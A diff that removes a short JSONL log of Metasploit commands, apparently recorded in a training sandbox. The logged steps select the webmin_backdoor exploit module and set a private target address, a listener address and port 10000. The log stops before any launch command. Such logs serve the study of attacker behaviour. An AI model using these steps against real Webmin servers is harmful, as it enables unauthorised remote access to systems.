@@ -1,5 +1,0 @@
-{"sandbox_id": "56", "timestamp_str": "2020-07-15T10:44:51.038851+02:00", "cmd_type": "msf-command", "cmd": "use unix/webapp/webmin_backdoor"}
-{"sandbox_id": "56", "timestamp_str": "2020-07-15T10:44:55.190992+02:00", "cmd_type": "msf-command", "cmd": "show options"}
-{"sandbox_id": "56", "timestamp_str": "2020-07-15T10:45:22.434891+02:00", "cmd_type": "msf-command", "cmd": "set RHOSTS 172.18.1.5"}
-{"sandbox_id": "56", "timestamp_str": "2020-07-15T10:46:23.630565+02:00", "cmd_type": "msf-command", "cmd": "set LHOST 10.1.135.83"}
-{"sandbox_id": "56", "timestamp_str": "2020-07-15T10:46:36.444720+02:00", "cmd_type": "msf-command", "cmd": "set RPORT 10000"}
